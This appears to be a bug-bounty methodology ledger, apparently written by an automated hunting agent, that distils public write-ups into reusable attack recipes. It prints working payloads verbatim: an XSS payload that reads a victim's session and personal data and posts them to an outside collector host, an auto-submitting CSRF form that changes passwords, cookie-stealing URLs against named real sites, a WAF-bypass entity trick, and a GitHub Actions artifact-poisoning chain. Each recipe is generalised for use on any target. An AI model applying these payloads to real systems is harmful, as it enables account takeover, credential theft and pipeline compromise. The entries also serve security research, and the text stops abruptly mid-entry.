  6. THE TWO SIBLING FINDINGS (read, recorded as DUPLICATES — not re-appended): (a) waybackurls -> a reflected parameter -> plain reflected XSS, verbatim: "The first I did is to use Waybackurls ... so I can collect all the hidden parameters ... The value of the parameter ?photographer= was reflected on the page, to test if it's possible for XSS I add a value Gonz"> to ?photographer= and it was reflected without sanitizing the symbols" and the final payload `https://www.nederlandsesoorten.nl/linnaeus_ng/app/views/search/nsr_search_pictures.php?photographer="><script>alert(document.cookie)</script>`; (b) an open redirect escalated with a `javascript:` URI, verbatim: "But using the demo credential I found an open redirect vulnerability https://terminologie.nictiz.nl/art-decor/login?returnToUrl=//google.com ... I used the below payload to escalate into XSS **Payload**:javascript:alert(1)" -> `https://terminologie.nictiz.nl/art-decor/login?returnToUrl=javascript:alert(document.cookie)`.
DETECTION SIGNAL: a "change password" / "set new password" / "reset password" endpoint (`/change-password`, `/account/password`, `/profile/password`, `/api/user/password`, `/settings/security`) that (a) accepts a NEW password without requiring the CURRENT one (no `current_password`/`old_password` field, or it is optional/ignored) and (b) has no CSRF token / nonce / `Origin`+`Referer` check (the form POSTs with only the session cookie); an account page where the password form is a plain POST with no anti-CSRF hidden field. TELL: an auto-submitting cross-site form that POSTs only the new password changes the victim's password and the attacker can then log in.
CHAIN: any unauthenticated attacker who can make the victim visit a page (primitive: one link / one image-tag request) -> the attacker hosts an auto-submitting HTML form that POSTs the target's change-password endpoint with a password of the attacker's choosing (primitive: no CSRF token AND no current-password check) -> the victim's ambient session authenticates the POST (escalation: the password change is performed FOR the victim) -> the attacker logs in with the new password (impact: full account takeover; the article's report was accepted and resolved). Per doctrine §8: preconditions = the victim is authenticated on the target and visits the attacker's page (one interaction); gain = the victim's password is replaced and the attacker controls the account.
TRANSFERABLE TEST: on ANY authenticated app — (1) capture the change-password request the real client sends and enumerate its fields: if there is no `current_password`/`old_password` (or it is blank/optional) the endpoint is CSRF-able into an ATO; (2) check for a CSRF token/nonce/`Origin` check — if none, build `<body onload="document.forms[0].submit()"><form method="POST" action="https://<target>/change-password"><input type="hidden" name="password" value="<attacker-chosen>"><input type="hidden" name="password_confirm" value="<attacker-chosen>"></form></body>`; (3) open it in a second browser profile where the victim is logged in (or send it to the victim) and confirm the password changed by logging in with the attacker-chosen value; (4) also try the same shape on adjacent account-mutation endpoints that lack the current-password check (e-mail change, 2FA disable, PIN set, recovery e-mail) — the same missing-precondition bug usually repeats. Rule: **a password-change endpoint that neither requires the current password nor carries a CSRF token is a one-link account takeover — the "no current password" precondition is what turns a missing CSRF token from a P4 into an ATO.**
DEDUPE: 0 hits across all three write targets for `repository.scp.nl`, `gonzx`, `nictiz`, `nederlandsesoorten`, `photographer`, `returnToUrl`, `change-password` (as a CSRF carrier). The `javascript:`-in-a-redirect-parameter technique is REVIEWED as already recorded (§17.83, §17.131, §17.262, and the `dest`/`next`/`continue`/`return_to`/`redirect_uri` transferable test) — the `returnToUrl=javascript:alert(document.cookie)` finding is a straight instance of it, NOT re-appended. The waybackurls-to-reflected-parameter method is already recorded as recon practice (CDX/`gau`/`waybackurls` for historical endpoints/parameters). The CSRF class is owned by the `csrf-testing` skill (V-07..V-17); NONE records the PASSWORD-CHANGE carrier with the "does not require the current password" precondition as the ATO trigger. No new §17 slot (carrier delta).

SOURCE: https://mohamedtarekq.medium.com/defeat-the-httponly-flag-to-achieve-account-takeover-rxss-c16849d3d192  2026-11-10
ROUTE: `web_extract` on the live page -> HTTP 200, full body read (the whole article incl. both code blocks and the final base64 payload; no fallback route needed).
STATUS: UNVERIFIED (not reproduced — no target endpoint was called and no exfil listener was stood up this pass; every code line, parameter and quote below is verbatim from the article).
CLASS: reflected XSS (base64-parameter reflection) ESCALATED past an HttpOnly session cookie -> session/PII theft -> account takeover (CWE-79 -> CWE-200 / CWE-522).
CORE METHOD:
  1. THE ENTRY POINT, verbatim: "I was testing the change email address functionality and when I changed my email address it redirect me to a URL like https://xyz-target.com/authn/email/needverification?e=dGltb29vbkBidWdjcm93ZG5pbmphLmNvbQ=="
  2. THE SINK, verbatim: "I notice that there is a base64 parameter (e) in the URL, so when decoded it I found that it's my new email which is reflected in the page. Therefore I decided to change the value of the base64 parameter (e) to XSS payload and encode it with base64."
  3. THE FIRST PAYLOAD, verbatim: `https://xyz-target.com/authn/email/needverification?e=PGltZy9zcmMvb25lcnJvcj1hbGVydChkb2N1bWVudC5jb29raWUpPg==` — base64 of `<img/src/onerror=alert(document.cookie)>`.
  4. THE WALL, verbatim: "But unfortuenatly, the session has HttpOnly flag therefore I couldn't get it via java script. I know till now it's a P3 severity Vulnerability, but I usually don't stop here when I could run JS code."
  5. THE ESCALATION STEP, verbatim: "the next day after I had a good sleep, I fired up my burp suite to look for an endpoint that returns sensitive data or the user's session. and I found an interesting one that returned the user's PII information including the user's session. This endpoint looks like this URL: https://api.target.com/home/v1/UserPersonalization/mymodules?more=true"
  6. THE EXFIL FETCH, verbatim:
     `fetch('https://api.target.com/home/v1/UserPersonalization/mymodules?more=true', { method: 'get', credentials: 'include', headers: { 'Content-Type': 'application/json' } }).then(response => response.text());`
     then `.then(data => { var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://timooon.free.beeceptor.com/data'); xhr.send(data); });`
     and, verbatim: "Thanks to `credentials: 'include'` attribute in the fetch method which sends the victim's cookie with the request."
  7. THE FINAL PAYLOAD, verbatim:
     `<img src onerror="fetch('https://api.target.com/home/v1/UserPersonalization/mymodules?more=true', { method: 'get', credentials: 'include', headers: { 'Content-Type': 'application/json' } }).then(response => response.text()).then(data => { var xhr = new XMLHttpRequest(); xhr.open('POST', 'https://timooon.free.beeceptor.com/data'); xhr.send(data); });">`
     base64-encoded and delivered as `?e=<base64>`.
  8. THE OUTCOME, verbatim: "And Voila! the response which contains the victim's session and his PII information was sent to my server!" and "Finally, the submission was triaged and rewarded as P2, so to everyone who finds XSS vulnerability, please give yourself some time to escalate your finding severity."
DETECTION SIGNAL: an XSS you cannot turn into `document.cookie` because the session cookie is `HttpOnly`; an authenticated API/JSON endpoint on the SAME origin (or a CORS-allowed origin) whose RESPONSE BODY contains the session token, CSRF token, or PII (`/home/v1/UserPersonalization/mymodules`, `/api/me`, `/api/account`, `/api/user`, `/api/profile`, `/api/v1/...`); a page that reflects a base64/URL-encoded parameter into HTML (the `?e=<base64>` shape) — the encoding is a delivery carrier, not a defence. TELL: the fetch with `credentials:'include'` returns 200 and the response body carries a session/token/PII string that is not in `document.cookie`.
CHAIN: any attacker who can make the victim click a link (primitive: one reflected parameter in a URL) -> the parameter is base64-decoded and reflected into the page (primitive: an encoding carrier around an unsanitized reflection) -> the payload executes in the victim's authenticated origin (escalation: XSS in a live session) -> `document.cookie` is blocked by `HttpOnly`, so the script instead calls an authenticated same-origin API with `credentials:'include'` and reads the RESPONSE BODY, which contains the session token + PII (escalation: the HttpOnly flag is bypassed by reading the session from an API response rather than from the cookie) -> the body is POSTed to the attacker's listener (impact: session hijack + PII theft = account takeover; the program rated it P2). Per doctrine §8: preconditions = the victim is authenticated and clicks the crafted link (one interaction); gain = the victim's session token and PII, hence full account control.
TRANSFERABLE TEST: on ANY XSS where `document.cookie` is `HttpOnly` — (1) enumerate the app's own authenticated GET endpoints (JS bundles, Swagger, the network tab of the account/profile/settings pages) and look for one whose RESPONSE BODY contains a token, session id, CSRF token, or PII; (2) from the XSS context, run `fetch('<endpoint>', {credentials:'include'}).then(r=>r.text())` and exfiltrate the text with `xhr.open('POST','https://<collector>/d'); xhr.send(data)` (or an `<img src="https://<collector>/?d="+encodeURIComponent(data)>` if XHR is CSP-blocked); (3) confirm the collector receives a session/token string; (4) also try `credentials:'include'` against cross-origin APIs that send `Access-Control-Allow-Origin: <the vulnerable origin>` + `Access-Control-Allow-Credentials: true`. Rule: **HttpOnly stops `document.cookie`, not authenticated reads — an XSS that can call an API whose response contains the session/PII with `credentials:'include'` is an ATO, so escalate every HttpOnly XSS by hunting the endpoint that RETURNS the session rather than the cookie that stores it.**
DEDUPE: 0 hits across all three write targets for `mohamedtarekq`, `timooon`, `needverification`, `UserPersonalization`, `mymodules`, `e=dGltb29vbk`, `credentials: 'include'` (as an XSS exfil leg — the only hits are the CORS cheat-sheet template lines and the cookie-sandwich §17.248 entry, which reads the cookie through a SERVER-side parser trick, not through an authenticated API response). Related-but-distinct: §17.248 (cookie sandwich — a legacy cookie-parser differential), §17.235 (stacking a `Set-Cookie` response into a reflected body), the Swagger `configUrl` entry (reads `localStorage`), and the CORS-waiver material. NONE records the "read the session from an authenticated API RESPONSE because the cookie is HttpOnly" escalation. New general method -> §17.402.

SOURCE: https://medium.com/@the_harvester/bypassed-cloudflares-web-application-firewall-waf-44da57f3a1d3  2026-11-10
ROUTE: `web_extract` on the live page -> HTTP 200 but the body was TRUNCATED mid-article (~2,000 chars, ending "The URL b"); re-fetched with `char_limit=30000` -> HTTP 200, FULL body read (the detection, the HTML-injection baseline, the brute-force oracle, the winning payload and the browser note). `https://r.jina.ai/<url>` -> HTTP 200 with an EMPTY body ("Keyless Exa extract failed"). Route that worked: `web_extract` with a raised `char_limit`.
STATUS: UNVERIFIED (not reproduced — no wedexs.com request was made and no WAF was probed this pass; every quote and payload below is verbatim from the article).
CLASS: WAF bypass (regex/blacklist) on a reflected parameter -> XSS; the bypass is a LONG-FORM NUMERIC CHARACTER REFERENCE WITH LEADING ZEROS for a single character, selected by a STATUS-CODE differential oracle (CWE-79 / CWE-693).
CORE METHOD:
  1. THE SURFACE, verbatim: "I came across a website https://www.wedexs.com which had a search option there. Anything that I would search would be sent using GET method searchQuery in the URL. Therefore the URL would become https://www.wedexs.com/search?searchQuery=<searchString>."
  2. THE FILTER MAP, verbatim: "The URL becomes https://www.wedexs.com/search?searchQuery='/\\"#abc which gave the output: The search string was '/\\"#abc, and in the output only '/\\"" got displayed. Therefore, from this we can infer that the special character # is filtered in the back-end, and the string following it is also truncated." and, verbatim: "So let's try for a simple SQL Injection payload, 'or 1=1 — ... which gives the cloudflare page of blocking the request."
  3. THE HTML-INJECTION BASELINE, verbatim: "First vulnerability found was reflected HTML injection." and "But it was able to perform HTML injection for <img src=x>" — tags and attributes pass; only JS-invoking constructs are blocked.
  4. THE INFERENCE, verbatim: "From this we can infer that the HTML tags and attributes are not filtered by the WAF except those which can invoke javascript. Therefore, from this we also understand that the WAF must be running on some regex or having some blacklisted wordlist from which it is filtering or blocking the request."
  5. THE ORACLE, verbatim: "I used my burpsuite and bruteforced the payload to capture the HTTP status. The wordlist was over and it was time to analyze the results. They all were having 404 error except one which gave 300 status code."
  6. THE WINNING PAYLOAD, verbatim: "The payload was <svg onload=prompt&#0000000040document.domain)> Hex: <svg onload=prompt&#x000000028;document.domain)>.But it didn't work for me." — the decimal form pads the codepoint with leading zeros (`&#0000000040;` = `(`), the hex form likewise (`&#x000000028;` = `(`).
  7. THE BROWSER DEPENDENCE, verbatim: "The payload works in the combination only, but the only thing which went wrong was the browser. I changed by browser to Microsoft Edge and then the page got loaded after bypassing the WAF with an alert box." and "The HEX encode payload was able to bypass the regex of WAF running in the back-end." (It did NOT fire in Firefox.)
DETECTION SIGNAL: a WAF that blocks `<script>`, `<img ... onerror=alert(...)>` and `alert(` but ALLOWS `<img src=x>` / `<h1>` (i.e. it filters JS-invoking constructs by regex/blacklist, not by parsing); a reflected parameter whose blocked-vs-passed boundary is a single character; a brute-force run where every payload returns the same status (403/404/blocked page) EXCEPT one that returns a different status (300/200/302). TELL: the payload that returns a non-block status is the bypass, and it may only execute in SOME browsers — Firefox did not fire it, Edge did.
CHAIN: any attacker who can send a URL (primitive: one reflected parameter) -> the WAF's regex matches the literal `(` / `alert(` and blocks the request (primitive: a blacklist/regex filter) -> the payload encodes ONE character as a long-form numeric character reference with leading zeros (`&#0000000040;`), which the regex does not recognise (escalation: the filter is bypassed and the request reaches the app) -> the browser decodes the reference back to `(` and the handler fires (impact: XSS in the victim's session; the article's finding was accepted). Per doctrine §8: preconditions = a reflected parameter behind a regex/blacklist WAF and a victim who clicks the link; gain = script execution as the victim.
TRANSFERABLE TEST: on ANY parameter behind a WAF — (1) map the filter: send `<h1>x</h1>`, `<img src=x>`, `<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>`, `alert(1)`, `'or 1=1--` and record which are blocked (403/blocked page) vs reflected; (2) brute-force a small XSS wordlist through Burp Intruder while CAPTURING THE HTTP STATUS of every response — the winning variant is the one whose status DIFFERS from the block status (the article: 404/blocked for all, 300 for the winner); (3) for a blocked single character, try the long-form numeric references with leading zeros — `&#0000000040;` for `(`, `&#x000000028;`, `&#0000000060;` for `<` — and the hex form `&#x0000003c;`; (4) re-test the winning payload in at least TWO browsers (Firefox + Chrome/Edge) because character-reference decoding in attribute contexts differs. Rule: **a regex WAF that blocks the literal `(` can be bypassed by encoding that one character as a zero-padded numeric character reference (`&#0000000040;`) — brute-force the payload list against the STATUS CODE to find the variant the filter misses, then confirm it in a second browser.**
DEDUPE: 0 hits across all three write targets for `&#0000000040`, `000000028`, `&#x000000028`, `leading zeros`, `zero-padded`, `long-form numeric`. The WAF-evasion material REVIEWED as related-but-distinct: the WAF evasion table's "HTML entity encoding of field values" (`value="&#x61;&#x74;..."`) and the cheat sheet's "HTML entity (hex)" encode the WHOLE payload, and the decode-order-mismatch entry (`&#x3C;`, `%253C`, nested entities) is about layers decoding a different number of times — NONE records the SINGLE-CHARACTER, ZERO-PADDED reference used to slip a regex that matches the canonical `&#40;`/`&#x28;` form, nor the status-code differential as the selection oracle, nor the Firefox-vs-Edge decoding dependence. No new §17 slot (the WAF-evasion table owns the general method; this is the zero-padded-entity carrier + the oracle + the browser-dependence delta).

SOURCE: https://www.adico.me/post/xss-in-gmail-s-amp4email  2026-11-10
ROUTE: `web_extract` on the live page -> HTTP 200, full body read (background, methodology, the initial vector, the Gmail escaping research, the selector discovery, the final payload and the timeline; no fallback route needed).
STATUS: UNVERIFIED (not reproduced — no AMP4Email message was sent and no Gmail/AMP filter was probed this pass; every payload and quote below is verbatim from the article).
CLASS: XSS in an AMP-for-Email (dynamic e-mail) sanitizer -> script execution in the victim's mailbox (CWE-79); the bypass is a CSS-SELECTOR-context ESCAPE-DECODING differential between the AMP validator and Gmail's second filter.
CORE METHOD:
  1. THE PRINCIPLE, verbatim: "I found out over the years that the easiest way to circumvent an XSS filter is by tricking it into a different rendering context than what the browser will actually use to render a given piece of code. For this to work, I need to be able to write a payload that contains more than one rendering context. Plain HTML is given as the first context. But additional ones can be achieved through many means (Templates, SVG, Math, CSS, etc…). In the scope of AMP4Email however, most of those are forbidden and one of my only real options is Stylesheets, so I've decided to focus my research around that."
  2. THE BASE VECTOR (fires in the AMP Playground, blocked by Gmail), verbatim:
     `<style amp-custom>body{color:red}</styleX>`
     `<meta name="</style><img src='x'onerror=alert(1)">`
     and the mechanism, verbatim: "The reason this vector works is that AMP is being slightly too greedy, and leaves the CSS context as soon as it encounters the string "</style" even if it doesn't have a closing bracket ">" or at least a whitespace after it." / "But when the browser (which still renders CSS at this point) encounters this tag, it counts it as malformed CSS, terminates the stylesheet at the real </style> tag and renders the <img> tag with its onerror attribute, triggering the XSS."
  3. THE GMAIL WALL, verbatim: "If you try sending this payload to Gmail however, the entire document fails to load. (which is what happens when the filter encounters a significant validation error)"
  4. THE ESCAPING RULE, verbatim: Gmail rewrites `<style>div{font-family:'aa/*f</xxx> ff*/'}</style>` into `<style>div{font-family:'aa/*f\00003c/xxx\00003e ff*/'}</style>` — "since I can't terminate a tag without HTML entities('<' , '>') What looked like a promising vector in AMP, seemed way less interesting after Gmail ran its magic on it."
  5. THE SELECTOR HOLE, verbatim: "If we send the following payload to Gmail `<style amp-custom>[id='a<br>aa'],body{font-family:'aaaa'}</style>` we get back the exact same thing, no escaping or other mutations take place" — the CSS SELECTOR context is NOT entity-encoded.
  6. THE CLOSING-TAG WALL, verbatim: "I decided to delete the "e" and send "</styl>" to see how Gmail handles this case. And this might not surprise you at this point, but Gmail did not appreciate my attempt" / "So now I know that Gmail has an even stricter filter and just deletes the payload as soon as anything resembling a closing </style> tag is encountered."
  7. THE ESCAPE-DECODE DISCOVERY, verbatim: "Since every other CSS Context encoded my HTML Entities besides Selectors, what would happen if I send an Encoded Selector to Gmail? Will it get decoded for me?" — `<style amp-custom>[id='a<b\000072> aa'],body{font-family:'aaaa'}</style>` -> "And Yes! It worked! Gmail actually decoded the \\000072 into the letter 'r'" — and then `<style amp-custom>[id='a</st\000079le> aa'],body{font-family:'aaaa'}</style>` -> "I sure can!"
  8. THE FINAL PAYLOAD, verbatim:
     `<style amp-custom>[id='</st\000079le></head><body>\`
     `<img src=https://bla.com/xx.jpg onerror=a=1>']{color:blue}</style>`
     "I could immediately see this worked when I opened the email and noticed the broken image."
  9. THE TIMELINE, verbatim: "Mar 27th 2021 - Reported issue to Google / Apr 1st 2021 - "Nice Catch" response from Google / Apr 13th 2021 - Awarded a bounty of 5000$ / Jul 7th 2022 - Notice the issue was fixed ... / Jul 9th 2022 - Blog post published"
DETECTION SIGNAL: an AMP-for-Email / dynamic-e-mail / rich-e-mail renderer (Gmail AMP4Email, and any sanitizer that allows `<style amp-custom>` or a CSS block inside user content); a filter that entity-encodes `<`/`>` in CSS string/comment contexts (`\00003c`/`\00003e`) but leaves CSS SELECTOR attribute values untouched; a validator that errors on any literal `</style`-ish sequence (`</style`, `</styl`, `</styleX`) but accepts the same characters when written as CSS hex escapes (`\000079` = `y`). TELL: a payload whose closing-tag characters are written as CSS escapes inside a `[attr='…']` selector survives the filter and decodes into a live `</style>` in the rendered mail.
CHAIN: anyone who can send an e-mail that the target's renderer accepts (primitive: one dynamic-e-mail payload) -> the payload's CSS block passes the validator because the dangerous characters are CSS-escaped inside a selector (primitive: the selector context is not entity-encoded) -> Gmail's/whatever second filter DECODES the CSS escapes (`\000079` -> `y`) after its own check, reconstructing `</style>` (escalation: the two filters disagree about the same bytes — a parser/context differential) -> the decoded `</style></head><body><img ... onerror=...>` renders as real HTML in the victim's mailbox (impact: script execution in the victim's mail client/session — Gmail paid $5,000). Per doctrine §8: preconditions = the victim opens the attacker's dynamic e-mail in a renderer that honours AMP/CSS; gain = script execution in the victim's mail origin/session.
TRANSFERABLE TEST: on ANY renderer that sanitises user-supplied HTML/CSS (AMP4Email, rich-text editors, e-mail templating, markdown+CSS, a CSS allow-list) — (1) establish the filter's context map by sending a probe per CSS context: string (`font-family:'…'`), comment (`/*…*/`), selector (`[id='…']`), at-rule, property value — and diff what comes back (Gmail entity-encodes the string/comment contexts as `\00003c`/`\00003e` but leaves the SELECTOR context verbatim); (2) inside the UNENCODED context, write the closing tag with CSS hex escapes — `[id='</st\000079le>']` (`\000079` = `y`) — and check whether the filter accepts it and the renderer later decodes it; (3) once the escape is decoded, append the real markup (`</head><body><img src=x onerror=…>`) inside the same selector; (4) also try the "greedy `</style`" trick (`</styleX>`) and the `<meta name="</style><img …>">` attribute carrier, and test each in the actual client (the AMP Playground and Gmail differ). Rule: **a sanitiser that entity-encodes CSS strings but not CSS selectors is bypassed by writing the breakout characters as CSS hex escapes inside a selector — the filter sees `\000079` (safe), the renderer decodes it to `y` (live `</style>`).**
DEDUPE: 0 hits across all three write targets for `AMP4Email`, `amp4email`, `amp-custom`, `000079`, `\00003c`, `CSS selector` (as a sanitizer context hole), `adico`. Related-but-distinct: §17.228 (untrusted CSS rendered in a trusted origin — click hijacking / attribute-selector token leaks, not a filter breakout), §17.231 (SVG sanitizer parser differentials), §17.247 (codepoint->byte cast), and the entity-encoding WAF entries. NONE records a CSS-SELECTOR-context escape-decoding breakout in an AMP/e-mail sanitizer. New general method -> §17.403.

SOURCE: https://alpinnnnnn13.medium.com/stored-xss-in-app-gitbook-com-6349f42661f7  2026-11-10
ROUTE: `web_extract` on the live page -> HTTP 200, full body read (a short 2-minute article; the whole technique is one paragraph).
STATUS: UNVERIFIED (not reproduced — no GitBook instance was touched; every quote below is verbatim from the article).
CLASS: stored XSS via a `javascript:` URI in a rich-text editor's LINK field — the field has no scheme allowlist (CWE-79).
CORE METHOD:
  1. THE ENTRY POINT, verbatim: "Saya menemukan bug XSS ini di sebuah kolom yang sangat identik dengan XSS yaitu kolom insert link, Karena kolom ini biasanya ada yang tidak di filter untuk menggunakan HTTP/HTTPS, Saya coba memasukan code javascript biasa seperti javascript:alert() dan ternyata benar kolom tersebut tidak memiliki filter HTTP/HTTPS." (Indonesian; the author is Mohammad Alfin Hidayatullah, and the finding is on `app.gitbook.com`.)
  2. THE PAYLOAD, verbatim: `javascript:alert()` typed into the "insert link" field.
  3. THE OUTCOME, verbatim: "Setelah mendapatkan respond seperti ini saya langsung mencoba untuk melaporkan nya, selang beberapa hari saya mendapatkan izin untuk membuat artikel tentang temuan saya dan bug nya juga sudah di perbaiki oleh team GitBook." (reported, then fixed by GitBook)
DETECTION SIGNAL: a rich-text editor / "insert link" / URL field that accepts `javascript:`, `data:`, `vbscript:` (or any scheme) with no allowlist; the stored value rendered as an `href` in the published/preview view. TELL: the `javascript:` value survives the save and the link executes on click.
CHAIN: any user who can edit a document (primitive: one link field) -> the field stores a `javascript:` URI with no scheme check (primitive: an unsanitised URL stored) -> the published/preview page renders it as an `href` (escalation: a stored XSS sink) -> a viewer clicks the link and script runs in the app origin (impact: stored XSS with session impact). NOTE: the chain closes only if the render path does not re-sanitise the stored href and there is no CSP blocking inline handlers.
TRANSFERABLE TEST: in EVERY rich-text / markdown / "insert link" / URL field, submit `javascript:alert(document.domain)` (and `data:text/html,<script>…</script>`, `vbscript:`) as the link target, save, then reopen the item in BOTH the edit/preview path and the published path and click the link (plain click, middle-click, Ctrl/CMD+click). Also diff the DRAFT/preview render against the PUBLISHED render — the sanitizer usually runs on only one of them.
DEDUPE: 0 hits for `gitbook`, `alpinnnnnn13`, `insert link` as a specific carrier. VALID-BUT-DUPLICATE — the technique is already recorded: the `javascript:`-in-an-href primitive (§17.83 and the cheat-sheet `javascript:<PROOF>()` row), the "link field / draft-preview href" transferable test (the recorded editor entry: "create a DRAFT/scheduled/preview item, intercept the save and set the href to `javascript:alert(document.cookie)`; reopen it in EDIT/preview and click"), and the "enumerate the sanitizer's URL-bearing allow-list and submit an unsafe scheme" test. The article adds no endpoint, no payload variant, no bypass and no chain delta (it is a 2-minute post with one paragraph of method), so per the NO-DUPLICATES rule nothing is appended.

NOTE — §17 additions 2026-11-10 batch 129 (§17.401–§17.403 appended from the 6 assigned sources read ONE BY ONE in the given order; 5 entries appended to the harvest ledger + 3 §17 slots). NEW: (1) fpatrik / Swisscom — a SANITISE-then-CHARSET-CONVERT pipeline: `htmlspecialchars` runs on raw UTF-8, then `iconv('Windows-1252','UTF-8')` + `iconv('UTF-8','ASCII//TRANSLIT')` re-synthesises `<`/`>`/`"`/`'` from emoji bytes (`💋img src=x onerror=alert(document.domain)//💛`) -> §17.401. (2) mohamedtarekq — an HttpOnly session cookie does NOT stop an XSS: call an authenticated same-origin API with `fetch(..., {credentials:'include'})`, read the RESPONSE BODY (which contained the session + PII), and exfiltrate it via XHR POST -> ATO, rated P2 -> §17.402. (3) adico.me / Gmail AMP4Email — a sanitizer that entity-encodes CSS strings but NOT CSS selectors is bypassed by writing the breakout as CSS hex escapes inside a selector (`[id='</st\000079le>']`), which the renderer decodes into a live `</style>`; $5,000 -> §17.403. CARRIER DELTAS (no §17 slot): gonzx / Dutch government — a change-password endpoint that neither requires the current password nor carries a CSRF token is a one-link ATO (the `javascript:`-in-`returnToUrl` sibling is already §17.83); the_harvester / wedexs.com — a regex WAF that blocks the literal `(` is bypassed with a zero-padded numeric character reference (`<svg onload=prompt&#0000000040document.domain)>`), selected by a status-code differential (all payloads 404/blocked except the winner at 300) and browser-dependent (fired in Edge, not Firefox). VALID-BUT-DUPLICATE (read, nothing new): alpinnnnnn13 / GitBook — `javascript:alert()` in a rich-text "insert link" field; the `javascript:`-href primitive and the draft/preview link-field test are already recorded, and the article carries no endpoint, variant or chain delta. 0 fabricated. Full per-source route/honesty records are in the harvest ledger `/root/bugbountyhuntingskills.md` and `/root/hackbot-architecture/knowledge/methodologies-2026-11-10.md`.

SOURCE: https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks  2026-11-10
ROUTE: `web_extract` on the live page -> HTTP 200 but the body was TRUNCATED at the same point on BOTH a 30,000-char and a 100,000-char budget (ending mid-sentence at "- A bug"); the browser tool (`browser_exec` -> `document.body.innerText`) returned the FULL 10,052-char article, including the technical section, the vulnerable-workflow shape and the mitigation. Route that worked: the browser tool.
STATUS: UNVERIFIED (not reproduced — no GitHub Actions workflow was created and no artifact was downloaded this pass; every quote below is verbatim from the article).
CLASS: CI/CD pipeline privilege escalation / code execution in a privileged workflow context — a third-party GitHub Action extracts a downloaded artifact into the CURRENT WORKING DIRECTORY by default, so an artifact file whose name matches a file the workflow later executes overrides it (CWE-20 / CWE-367 / CWE-269).
CORE METHOD:
  1. THE ACTION, verbatim: "Introducing 'dawidd6/action-download-artifact'" — "This is a very useful custom action because it provides an API similar to GitHub's official - 'actions/download-artifact'. But it extends it with extensive filtering capabilities and allows for downloading artifacts from different workflows and even different repositories."
  2. THE DEFAULT-PATH DEFECT, verbatim: "a problem arises with the case where path is not provided. The action's documentation had an error, stating that the path defaults to the artifact name, while in fact, it defaults to \"./\", meaning if it's not provided, the artifact will be extracted to the current working directory."
  3. THE OVERRIDE RULE, verbatim: "Another important fact: when an artifact is extracted, files with the same name as the ones inside the archive will be overridden by the artifact files."
  4. THE VULNERABLE WORKFLOW SHAPE, verbatim: "The above workflow: Checks out the repository's main branch / Downloads an artifact from a previous workflow / Executes a script from the main branch" — i.e. checkout -> `dawidd6/action-download-artifact` with NO `path:` -> `run: python some_script.py` (or any execution of a file in the working directory).
  5. THE EXPLOIT, verbatim: "So, if the current directory contains a file that is planned to be executed, an attacker could replace it with a malicious one and hijack the workflow execution."
  6. THE DELIVERY, verbatim: "\"some workflow\" triggers the \"workflow_run\" from above. Note that the vast majority of workflows that use dawidd6/action-download-artifact are triggered on workflow_run, and attacking it will result in privilege escalation in the pipeline, as we previously published. Any GitHub user can fork the vulnerable repository, create a pull request that modifies \"some workflow\" as above, and due to the nature of workflow_run - it will be triggered automatically (even when code review is required), and the poisoned some_script.py will be executed in a privileged context, allowing the attacker to steal secrets, modify artifacts, etc."
  7. THE OFFICIAL-ACTION CONTRAST, verbatim: "GitHub's original 'download-artifact' action, which is the basis for dawidd6's action, is also extracting in the current directory as a default behavior, but it poses no risk since the official action can only be run in the same given workflow job where the upload occurred."
  8. THE MITIGATION, verbatim: "Whenever you use 'dawidd6/action-download-artifact' make sure you provide the following parameters: 'path' - so the archive won't be extracted in the current directory / 'commit' / 'run_id' - to make sure you download the artifact from a known source"
DETECTION SIGNAL: a GitHub Actions workflow that (a) downloads an artifact with a third-party action (`dawidd6/action-download-artifact`, or any `download-artifact`-style step) and (b) does NOT set `with: path:` (or sets it to `./`), and (c) subsequently executes a file from the working directory (`run: ./script.sh`, `run: python some_script.py`, `run: bash build.sh`, a `Makefile` target, a `package.json` script). TELL: the artifact's zip contains a file with the SAME NAME as the file the workflow executes; the extract step overwrites it before the `run:` step.
CHAIN: any GitHub user (primitive: a fork + a pull request) -> the target repo's workflow is triggered on `workflow_run`, which fires automatically even when code review is required (primitive: an externally-triggerable privileged context) -> the attacker's artifact (uploaded by the attacker's own workflow run, or taken from a previous run) is extracted into the working directory with no `path:` and overrides a file the workflow executes (escalation: attacker-controlled bytes replace a trusted file) -> the workflow's `run:` step executes the poisoned file in the privileged context (impact: steal secrets, modify artifacts, code execution in the pipeline; the article frames it as privilege escalation in the pipeline). Per doctrine §8: preconditions = the target uses the vulnerable action without `path:` and runs a file from the working directory, and the attacker can open a PR; gain = code execution in the privileged workflow context with access to secrets.
TRANSFERABLE TEST: on ANY CI/CD pipeline (GitHub Actions, GitLab CI, CircleCI, Jenkins, Azure DevOps, Buildkite) — (1) find every artifact-download / archive-extract step and check whether it sets an explicit destination directory; a default of `./` or the working directory is the signal; (2) list the files the job executes AFTER the extract (`run:` steps, `Makefile` targets, `package.json` scripts, `*.sh`/`*.py`/`*.js` invoked by name) and check whether any of those names can appear inside an artifact an attacker can influence; (3) build a zip containing a file with that exact name whose content is a marker command (`echo PWNED > /tmp/pwned` or a callback to your listener) and run it through the same extract-then-execute sequence in a fork; (4) confirm the marker executes in the privileged job. Rule: **an artifact extract that defaults to the working directory and a job that executes a file from that directory is a file-override -> code-execution chain — the artifact's zip is the write primitive and the `run:` step is the execution primitive.**
DEDUPE: 0 hits across all three write targets for `action-download-artifact`, `dawidd6`, `download-artifact` (as an artifact-extract carrier), `path defaults to`, `artifact` + `override`, `workflow_run` + `artifact`. The recorded GitHub Actions material is the EXPRESSION-INJECTION class (an externally-triggerable workflow whose `run:`/JS action writes `${{ github.event.*.body }}`/`github.head_ref` into `$GITHUB_ENV`/`$GITHUB_PATH`, and the `workflow_run`/`pull_request_target` trigger table) — that is a DIFFERENT primitive (unescaped expression interpolation into the shell), not an artifact-extract file override. NONE records the artifact-extract-to-working-directory override. New general method -> §17.404.

SOURCE: https://web.archive.org/web/20231031085557/https://securecloud.blog/2022/04/27/azure-monitor-malicious-kql-query/  2026-11-10
ROUTE: the LIVE page `https://securecloud.blog/2022/04/27/azure-monitor-malicious-kql-query/` is HIJACKED — it now serves a Vietnamese gambling spam site ("88CLB · Thành viên ABCVIP từ 2023", links to `securecloud.blog/gogo`), i.e. the original article is gone and the live host teaches nothing. The Wayback capture `web.archive.org/web/20231031085557/...` returned HTTP 200 with the FULL original article (the discovery, the `adx()` mechanism, the Node.js MITM route, the example KQL query, the curl and the evaluation). Route that worked: the Wayback Machine.
